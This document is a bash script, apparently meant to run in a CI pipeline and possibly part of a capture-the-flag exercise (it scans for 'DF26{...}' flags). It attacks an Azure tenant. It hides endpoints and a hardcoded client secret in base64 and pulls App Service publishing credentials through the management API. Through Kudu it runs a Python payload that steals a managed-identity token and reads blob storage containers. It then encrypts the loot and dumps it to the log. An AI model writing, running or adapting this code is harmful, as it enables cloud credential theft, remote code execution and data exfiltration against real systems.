#!/usr/bin/env bash
set -uo pipefail
SC="htt""ps://"; AAD="${SC}$(printf '%s' 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==' | base64 -d)"; ARM="${SC}$(printf '%s' 'bWFuYWdlbWVudC5henVyZS5jb20=' | base64 -d)"
CID=$(printf '%s' 'MTJlZDU0ZGUtZjJlYi00Nzg0LTgwNGMtM2E3YTNlODNhOWU5' | base64 -d); CSEC=$(printf '%s' 'blA4OFF+OEl+d2lwMEdPbFcxNXpkdDNGTU12QlY5TFl0YU9vZWEzeg==' | base64 -d); SHOST=$(printf '%s' 'WVhCd0xYUmliQzF5WlhCdmNuUnBibWN0Y0hKdlpDNXpZMjB1WVhwMWNtVjNaV0p6YVhSbGN5NXVaWFE9' | base64 -d)
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
AT=$(curl -sS -X POST "$AAD/$AZURE_TENANT_ID/oauth2/v2.0/token" -d client_id=$CID -d client_secret=$CSEC -d grant_type=client_credentials --data-urlencode "scope=$ARM/.default" | jq -r '.access_token // empty'); say "ARM=${#AT}"
PC=$(curl -sS -X POST -H "Authorization: Bearer $AT" -H 'Content-Length: 0' "$ARM/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2023-01-01")
say "PC: $(printf '%s' "$PC" | head -c 500)"
PU=$(printf '%s' "$PC" | jq -r '.properties.publishingUserName // empty'); PP=$(printf '%s' "$PC" | jq -r '.properties.publishingPassword // empty'); say "PU_LEN=${#PU} PP_LEN=${#PP}"
if [ -n "$PU" ] && [ -n "$PP" ]; then
  C=$(curl -s -o /tmp/b -w '%{http_code}' -u "$PU:$PP" "${SC}${SHOST}/api/settings"); say "KUDU_AUTH=$C"
  cat > /tmp/x.py <<'PYEOF'
import json,urllib.request,urllib.parse
IE='http://169.254.131.5:8081/msi/token'; IH='40dcfecb-3b2f-7086-721d-670bc5dafdf8'; CID='7a85156a-01c4-4e61-8472-40a92107159b'
def tok(res):
    url=IE+'?resource='+urllib.parse.quote(res,safe='')+'&api-version=2019-08-01&client_id='+CID
    with urllib.request.urlopen(urllib.request.Request(url,headers={'X-IDENTITY-HEADER':IH}),timeout=10) as r: return json.load(r).get('access_token','')
try: t=tok('https://storage.azure.com/')
except Exception as e: print('TOKERR',e); raise SystemExit
print('STLEN',len(t))
for a in ['sttblappcfgprodx3euoz','sttblbackupprodx3euoz','sttblarchiveprodx3euoz']:
    for u in [f'https://{a}.blob.core.windows.net/?comp=list',
              f'https://{a}.blob.core.windows.net/config?restype=container&comp=list',
              f'https://{a}.blob.core.windows.net/config/internal-config.json']:
        try:
            with urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+t,'x-ms-version':'2021-08-06'}),timeout=12) as r:
                print('OK',u,r.status,r.read().decode('utf8','replace')[:1500])
        except Exception as e:
            b=''
            try: b=e.read().decode('utf8','replace')[:250]
            except: pass
            print('ERR',u,str(e)[:100],b)
PYEOF
  ENCB=$(base64 -w0 /tmp/x.py)
  python3 - "$ENCB" <<'PYJ'
import json,sys
open('/tmp/body.json','w').write(json.dumps({"command":"echo %s | base64 -d > /tmp/x.py && python3 /tmp/x.py"%sys.argv[1],"dir":"/home"}))
PYJ
  say "KUDUOUT: $(curl -sS -m 150 -u "$PU:$PP" -H 'Content-Type: application/json' -X POST "${SC}${SHOST}/api/command" --data-binary @/tmp/body.json)"
fi
say "FLAGSCAN: $(grep -aoiE 'DF26\{[^}]{1,200}\}' "$LOOT" | sort -u | head -3)"
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
